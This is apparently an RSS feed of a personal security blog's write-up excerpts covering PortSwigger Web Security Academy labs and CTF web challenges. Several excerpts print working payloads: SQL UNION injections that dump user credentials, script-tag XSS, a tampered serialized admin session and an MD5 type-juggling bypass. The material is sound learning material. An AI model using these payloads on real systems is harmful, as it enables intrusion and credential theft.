<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Web :: Tag :: SBK Hugo Site</title><link>https://bernie6401.github.io/tags/web/index.html</link><description/><generator>Hugo</generator><language>en-us</language><atom:link href="https://bernie6401.github.io/tags/web/index.xml" rel="self" type="application/rss+xml"/><item><title>CrewCTF - sequence_gallery</title><link>https://bernie6401.github.io/security/practice/crewctf/web/crewctf---sequence_gallery/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/crewctf/web/crewctf---sequence_gallery/index.html</guid><description>CrewCTF - sequence_gallery Background Command Injection dc command in Linux with examples Linux dc命令
dc -h Usage: dc [OPTION] [file …] -e, –expression=EXPR evaluate expression -f, –file=FILE evaluate contents of file -h, –help display this help and exit -V, –version output version information and exit
Email bug reports to: bug-dc@gnu.org .
Source Code :::spoiler Source Code
import os import sqlite3 import subprocess from flask import Flask, request, render_template app = Flask(__name__) @app.get('/') def index(): sequence = request.args.get('sequence', None) if sequence is None: return render_template('index.html') script_file = os.path.basename(sequence + '.dc') if ' ' in script_file or 'flag' in script_file: return ':(' proc = subprocess.run( ['dc', script_file], capture_output=True, text=True, timeout=1, ) output = proc.stdout return render_template('index.html', output=output) if __name__ == '__main__': app.run(host='0.0.0.0', port=8080) :::</description></item><item><title>CSRF - APPRENTICE</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/csrf/csrf---apprentice/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/csrf/csrf---apprentice/index.html</guid><description>CSRF - APPRENTICE tags: Portswigger Web Security Academy Web [TOC]
Lab: CSRF vulnerability with no defenses Description: This lab’s email change functionality is vulnerable to CSRF. Goal: To solve the lab, craft some HTML that uses a CSRF attack to change the viewer’s email address and upload it to your exploit server. You can log in to your own account using the following credentials: wiener:peter Hint: You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim. Background :::spoiler CSRF 攻擊原理 [Day25]- 新手的Web系列CSRF</description></item><item><title>Deserialization - APPRENTICE</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/deserialization---apprentice/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/deserialization---apprentice/index.html</guid><description>Deserialization - APPRENTICE tags: Portswigger Web Security Academy Web Lab: Modifying serialized objects Description: This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result. Goal: To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges. Then, delete Carlos’s account. You can log in to your own account using the following credentials: wiener:peter Recon Login First &amp; Recon the package According to the description, we know that the user verification has insecure deserialization. Therefore, we can recon the package first as below. You can notice the session is a base64-encoded string and we use the built-in feature in burp suite to decode it. Session: Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d Decoded String: O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;} How about Modify the session directly Exp - Change Directly We can use the built-in feature to change our session to admin=1 directly to then send it forward. :::info Each package may contain the session that should be modified. So, pay attention to before sending it forward ::: Delete Carlos :::spoiler Success Screenshot :::</description></item><item><title>Lab: Arbitrary object injection in PHP</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/lab_-arbitrary-object-injection-in-php/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/lab_-arbitrary-object-injection-in-php/index.html</guid><description>Lab: Arbitrary object injection in PHP tags: Portswigger Web Security Academy Web Description: This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. Goal: To solve the lab, create and inject a malicious serialized object to delete the morale.txt file from Carlos’s home directory. You will need to obtain source code access to solve this lab. You can log in to your own account using the following credentials: wiener:peter Hint: You can sometimes read source code by appending a tilde (~) to a filename to retrieve an editor-generated backup file. Constructor &amp; Deconstructor Python建構函式與解構函式（init()和__del__()） 其實概念就是Python的__init()__ function，在instanciate一個class的時候扮演初始化的功能而已 而deconstructor就是Python中的__del__() function用來回收不需要的class，以達到降低記憶體的使用量</description></item><item><title>Lab: Blind XXE with out-of-band interaction</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/blind-xxe/lab_-blind-xxe-with-out-of-band-interaction/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/blind-xxe/lab_-blind-xxe-with-out-of-band-interaction/index.html</guid><description>Lab: Blind XXE with out-of-band interaction tags: Portswigger Web Security Academy Web Description: This lab has a “Check stock” feature that parses XML input but does not display the result. You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain. Goal: To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator. Hint: Background 有兩種廣泛的方法可以找到和利用Blind XXE 漏洞：</description></item><item><title>Lab: Blind XXE with out-of-band interaction via XML parameter entities</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/blind-xxe/lab_-blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/blind-xxe/lab_-blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities/index.html</guid><description>Lab: Blind XXE with out-of-band interaction via XML parameter entities tags: Portswigger Web Security Academy Web Description: This lab has a “Check stock” feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities. Goal: To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator. Hint: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator’s default public server. Background 這一題會用到Parameter Entity，也就是當server端擋掉外部的entity輸入時，可以直接在DOCTYPE中直接Reference，也就是利用%這個字元達到這個效果</description></item><item><title>Lab: CSRF where token is not tied to user session</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-is-not-tied-to-user-session/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-is-not-tied-to-user-session/index.html</guid><description>Lab: CSRF where token is not tied to user session tags: Portswigger Web Security Academy Web Description: This lab’s email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren’t integrated into the site’s session handling system. Goal: To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address. You have two accounts on the application that you can use to help design your attack. The credentials are as follows: wiener:peter carlos:montoya Background CSRF token should tied to user session otherwise, it’ll exploited by attacker.</description></item><item><title>Lab: CSRF where token is tied to non-session cookie</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/csrf/not-complete/lab_-csrf-where-token-is-tied-to-non-session-cookie/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/csrf/not-complete/lab_-csrf-where-token-is-tied-to-non-session-cookie/index.html</guid><description>Lab: CSRF where token is tied to non-session cookie tags: Portswigger Web Security Academy Web Description: This lab’s email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren’t fully integrated into the site’s session handling system.
Goal: To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address. You have two accounts on the application that you can use to help design your attack. The credentials are as follows: wiener:peter carlos:montoya</description></item><item><title>Lab: CSRF where token validation depends on request method</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-validation-depends-on-request-method/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-validation-depends-on-request-method/index.html</guid><description>Lab: CSRF where token validation depends on request method tags: Portswigger Web Security Academy Web Description: This lab’s email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests. Goal: To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address. You can log in to your own account using the following credentials: wiener:peter Recon Login and update email to trace the package Like the previous lab, we first login to the website and update the email. At the same time, we can trace update email package shown below: We can notice that the carried data including csrf_token</description></item><item><title>Lab: CSRF where token validation depends on token being present</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-validation-depends-on-token-being-present/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-validation-depends-on-token-being-present/index.html</guid><description>Lab: CSRF where token validation depends on token being present tags: Portswigger Web Security Academy Web Description: This lab’s email change functionality is vulnerable to CSRF. Goal: To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address. You can log in to your own account using the following credentials: wiener:peter Recon Login and update email to trace the package It’s very similar with previous lab $\to$ it contained CSRF_token as its carried data:</description></item><item><title>Lab: DOM XSS in `document.write` sink using source `location.search` inside a select element</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xss/lab_-dom-xss-in-document.write-sink-using-source-location.search-inside-a-select-element/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xss/lab_-dom-xss-in-document.write-sink-using-source-location.search-inside-a-select-element/index.html</guid><description>Lab: DOM XSS in document.write sink using source location.search inside a select element tags: Portswigger Web Security Academy Web Description: This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search which you can control using the website URL. The data is enclosed within a select element. Goal: To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the alert function. Recon Find the injection place I used string search to find location.search in each sub-page source. Here is the interesting code: :::spoiler Source Code ... &lt;script> var stores = ["London","Paris","Milan"]; var store = (new URLSearchParams(window.location.search)).get('storeId'); document.write('&lt;select name="storeId">'); if(store) { document.write('&lt;option selected>'+store+'&lt;/option>'); } for(var i=0;i&lt;stores.length;i++) { if(stores[i] === store) { continue; } document.write('&lt;option>'+stores[i]+'&lt;/option>'); } document.write('&lt;/select>'); &lt;/script> ... ::: Try type something about storeID as URL GET parameter Payload: /product?productId=1&amp;storeId=abc You can see that this is a perfect injection place Exp Payload: /product?productId=1&amp;storeId=&lt;script>alert(123);&lt;/script> :::spoiler Success Screenshot :::</description></item><item><title>Lab: Exploiting `XInclude` to retrieve files</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/lab_-exploiting-xinclude-to-retrieve-files/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/lab_-exploiting-xinclude-to-retrieve-files/index.html</guid><description>Lab: Exploiting XInclude to retrieve files tags: Portswigger Web Security Academy Web Description: This lab has a “Check stock” feature that embeds the user input inside a server-side XML document that is subsequently parsed. Because you don’t control the entire XML document you can’t define a DTD to launch a classic XXE attack. Goal: To solve the lab, inject an XInclude statement to retrieve the contents of the /etc/passwd file. Hint: By default, XInclude will try to parse the included document as XML. Since /etc/passwd isn’t valid XML, you will need to add an extra attribute to the XInclude directive to change this behavior. Background XInclude is a part of the XML specification that allows an XML document to be built from sub documents You can place an XInclude attack within any data value in an XML document, so the attack can be performed in situations where you only control a single item of data that is placed into a server side XML document</description></item><item><title>Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/external-malicious-server/lab_-exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/external-malicious-server/lab_-exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd/index.html</guid><description>Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD tags: Portswigger Web Security Academy Web Description: This lab has a “Check stock” feature that parses XML input but does not display the result. Goal: To solve the lab, exfiltrate the contents of the /etc/hostname file. Hint: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use the provided exploit server and/or Burp Collaborator’s default public server. Recon Use the previous method :::spoiler Payload</description></item><item><title>Lab: Exploiting blind XXE to retrieve data via error messages</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/external-malicious-server/lab_-exploiting-blind-xxe-to-retrieve-data-via-error-messages/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/external-malicious-server/lab_-exploiting-blind-xxe-to-retrieve-data-via-error-messages/index.html</guid><description>Lab: Exploiting blind XXE to retrieve data via error messages tags: Portswigger Web Security Academy Web Description: This lab has a “Check stock” feature that parses XML input but does not display the result. Goal: To solve the lab, use an external DTD to trigger an error message that displays the contents of the /etc/passwd file. The lab contains a link to an exploit server on a different domain where you can host your malicious DTD. Recon This is very similar to the previous lab(Exploiting blind XXE to exfiltrate data using a malicious external DTD)</description></item><item><title>Lab: Exploiting Java deserialization with Apache Commons</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/lab_-exploiting-java-deserialization-with-apache-commons/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/lab_-exploiting-java-deserialization-with-apache-commons/index.html</guid><description>Lab: Exploiting Java deserialization with Apache Commons tags: Portswigger Web Security Academy Web Description: This lab uses a serialization-based session mechanism and loads the Apache Commons Collections library. Although you don’t have source code access, you can still exploit this lab using pre-built gadget chains. Goal: To solve the lab, use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the morale.txt file from Carlos’s home directory. You can log in to your own account using the following credentials: wiener:peter Background ysoserial使用方法</description></item><item><title>Lab: Exploiting XXE via image file upload</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/lab_-exploiting-xxe-via-image-file-upload/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/lab_-exploiting-xxe-via-image-file-upload/index.html</guid><description>Lab: Exploiting XXE via image file upload tags: Portswigger Web Security Academy Web Description: This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files. Goal: To solve the lab, upload an image that displays the contents of the /etc/hostname file after processing. Then use the “Submit solution” button to submit the value of the server hostname. Recon In this lab, we can upload an exploited file which contained malicious xml data. Then we can fetch some sensitive information.</description></item><item><title>Lab: Modifying serialized data types</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/lab_-modifying-serialized-data-types/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/lab_-modifying-serialized-data-types/index.html</guid><description>Lab: Modifying serialized data types tags: Portswigger Web Security Academy Web Description: This lab uses a serialization-based session mechanism and is vulnerable to authentication bypass as a result Goal: To solve the lab, edit the serialized object in the session cookie to access the administrator account. Then, delete Carlos. You can log in to your own account using the following credentials: wiener:peter Background Loose Comparison Operator in PHP
PHP based logic is particularly vulnerable to this kind of manipulation due to the behavior of its loose comparison operator(==) when comparing different data types. For example: 5=="5" will be true when two types are different.</description></item><item><title>Lab: SQL injection attack, listing the database contents on non-Oracle databases :four:</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases-_four_/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases-_four_/index.html</guid><description>Lab: SQL injection attack, listing the database contents on non-Oracle databases :four: tags: Portswigger Web Security Academy Web Description: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application’s response so you can use a UNION attack to retrieve data from other tables. The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users. Goal: To solve the lab, log in as the administrator user. Exp Determine # of columns Payload: ?category=Gifts' union select NULL,NULL --</description></item><item><title>Lab: SQL injection attack, listing the database contents on Oracle</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-listing-the-database-contents-on-oracle/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-listing-the-database-contents-on-oracle/index.html</guid><description>Lab: SQL injection attack, listing the database contents on Oracle tags: Portswigger Web Security Academy Web Description: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application’s response so you can use a UNION attack to retrieve data from other tables. The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users. Goal: To solve the lab, log in as the administrator user. Hint: There is a built-in table on Oracle called dual which you can use for this purpose. For example: UNION SELECT 'abc' FROM dual Exp Determine # of columns Payload: ?category=Lifestyle' union select NULL,NULL from dual--</description></item><item><title>Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft/index.html</guid><description>Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft tags: Portswigger Web Security Academy Web Description: his lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query. Goal: To solve the lab, display the database version string. Exp Consider # of column Payload: ?category=Accessories' union select NULL,NULL -- # Consider column type Payload: ?category=Accessories' union select 'a','a' -- # Both of them contained text. Attack Payload: ?category=Accessories' union select 'abc',@@version -- # :::spoiler Success Screenshot ::: Reference</description></item><item><title>Lab: SQL injection attack, querying the database type and version on Oracle</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-querying-the-database-type-and-version-on-oracle/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-querying-the-database-type-and-version-on-oracle/index.html</guid><description>Lab: SQL injection attack, querying the database type and version on Oracle tags: Portswigger Web Security Academy Web Description: This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query. Our Goal: To solve the lab, display the database version string. Exp - SQLi Cheat Sheet - Examining the database in SQL injection attacks According to the cheat sheet above, we can use the command to fetch the version of this database, e.g. :::warning Before the recon, the hint told you that this database is created by Oracle. So, you must contained From preserved word in each query, e.g. SELECT 'abc' FROM dual :::</description></item><item><title>Lab: SQL injection UNION attack, determining the number of columns returned by the query</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query/index.html</guid><description>Lab: SQL injection UNION attack, determining the number of columns returned by the query tags: Portswigger Web Security Academy Web Description: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application’s response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack. Hint: To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values. Exp Payload: https://0ab2008b04e96b8f8057358e008d00d0.web-security-academy.net/filter?category=%27%20UNION%20SELECT%20NULL,NULL,NULL-- :::spoiler Success Screenshot :::</description></item><item><title>Lab: SQL injection UNION attack, finding a column containing text</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-finding-a-column-containing-text/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-finding-a-column-containing-text/index.html</guid><description>Lab: SQL injection UNION attack, finding a column containing text tags: Portswigger Web Security Academy Web Description: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application’s response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data. Hint: The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data. Exp Determine how many columns it has You can use the technique from previous question. Payload: ?category=' UNION SELECT NULL,NULL,NULL--</description></item><item><title>Lab: SQL injection UNION attack, retrieving data from other tables</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-retrieving-data-from-other-tables/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-retrieving-data-from-other-tables/index.html</guid><description>Lab: SQL injection UNION attack, retrieving data from other tables tags: Portswigger Web Security Academy Web Description: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application’s response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs. Hint: The database contains a different table called users, with columns called username and password. To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. Exp Using all technique we learned before According to union-based technique we learned before, we can consider there’re 2 columns in this database and both of them are text strings Payload: ?category=Lifestyle' UNION SELECT 'Title name','Post content'-- Find the detailed info in users table Payload: ?category=Lifestyle' UNION SELECT username, password FROM users-- Login as administrator Username: administrator Password: 5kg73b7jinl9plif82d3 :::spoiler Success Screenshot ::: Reference</description></item><item><title>Lab: SQL injection UNION attack, retrieving multiple values in a single column</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column/index.html</guid><description>Lab: SQL injection UNION attack, retrieving multiple values in a single column tags: Portswigger Web Security Academy Web Description: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application’s response so you can use a UNION attack to retrieve data from other tables. Hint: The database contains a different table called users, with columns called username and password. To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. Exp Consider how many columns in this table Payload: ?category=Lifestyle' UNION SELECT NULL,NULL-- Consider the type of each columns Payload: ?category=Lifestyle' UNION SELECT 1,'a'-- As the payload above, the 1st column is number-based string, and 2nd column is text-based string. :::spoiler Result ::: 通靈: Find username and password From the result above, there’s just one column is text-based string that we can inject, so we can use concatenate operator || to concatenate two strings that we query together. Payload: ?category=Gifts' UNION SELECT NULL,username||'~'||password FROM users-- :::spoiler Result ::: Login by username and password that we fetch :::spoiler Success Screenshot ::: Reference</description></item><item><title>Lab: Stored DOM XSS</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xss/lab_-stored-dom-xss/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xss/lab_-stored-dom-xss/index.html</guid><description>Lab: Stored DOM XSS tags: Portswigger Web Security Academy Web Description: This lab demonstrates a stored DOM vulnerability in the blog comment functionality. Goal: To solve this lab, exploit this vulnerability to call the alert() function. Recon Find the injected place According to the description, we know that the comment place of each post has some problems. So, we can try to inject something.
Try to inject Comment Payload: &lt;script>alert(123)&lt;/script> Seems weird, and when you browse the page source, you’ll find out that it calls external js files to import the comment, i.e.:</description></item><item><title>Lab: Using application functionality to exploit insecure deserialization</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/lab_-using-application-functionality-to-exploit-insecure-deserialization/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/lab_-using-application-functionality-to-exploit-insecure-deserialization/index.html</guid><description>Lab: Using application functionality to exploit insecure deserialization tags: Portswigger Web Security Academy Web Description: This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object.
Goal: To solve the lab, edit the serialized object in the session cookie and use it to delete the morale.txt file from Carlos’s home directory.
You can log in to your own account using the following credentials: wiener:peter You also have access to a backup account: gregg:rosebud</description></item><item><title>NISRA - different places</title><link>https://bernie6401.github.io/security/practice/nisra/web/nisra---different-places/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/nisra/web/nisra---different-places/index.html</guid><description>NISRA - different places tags: NISRA CTF Web Challenge: different places
Exploit - Integrate Fragments Flags View Page Sources base64 decode dXNlcm5hbWU6YWRtaW5fcGFzc3dvcmQ6bmlzcmE= $\to$ username:admin_password:nisra
Observe the form It uses get method to fetch the parameters. So we can peek login.php first. Then we could use the username and password we got at previous step. Payload: view-source:http://chall2.nisra.net:41025/login.php?username=admin&amp;password=nisra Then we got the last fragment flag.</description></item><item><title>NISRA - MD5_1</title><link>https://bernie6401.github.io/security/practice/nisra/web/nisra---md5_1/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/nisra/web/nisra---md5_1/index.html</guid><description>NISRA - MD5_1 tags: NISRA CTF Web Challenge: MD5_1
Source code &lt;?php highlight_file(__FILE__); $FROM_INCLUDE = true; include("flag.php"); $msg = ""; if (isset($_GET['user']) &amp;&amp; isset($_GET['password'])) { $user = $_GET['user']; $password = $_GET['password']; $check = "QNKCDZO"; // the md5 of "QNKCDZO" is 0e830400451993494058024219903391 if ($user == "admin" &amp;&amp; $password != $check &amp;&amp; md5($password) == md5($check)) { $msg = "Flag: ".$flag; } else { $msg = "Keep trying!"; } } echo $msg; ?> Exploit - MD5 Collision Payload: http://chall2.nisra.net:41022/?user=admin&amp;password=240610708 :::spoiler flag Flag: NISRA{PhP_is_th3_BeST_laNgUA9E} :::</description></item><item><title>NISRA - MD5_2</title><link>https://bernie6401.github.io/security/practice/nisra/web/nisra---md5_2/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/nisra/web/nisra---md5_2/index.html</guid><description>NISRA - MD5_2 Exploit Payload: curl http://chall2.nisra.net:41023/ -H "Content-Type: application/x-www-form-urlencoded" -X POST -d "user=240610708&amp;password=QNKCDZO" Flag: NISRA{S3CuR17y_1ssuEs_Of_pHP_@ND_Md5}
Reference md5(‘240610708’) == md5(‘QNKCDZO’)</description></item><item><title>NTU CS 2023 HW4 Write Up</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/ntu-cs-2023-hw4-write-up/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/ntu-cs-2023-hw4-write-up/index.html</guid><description>NTU CS 2023 HW4 Write Up Lab-Cat Shop Flag: FLAG{omg_y0u_hack3d_th3_c4t_sh0p!}
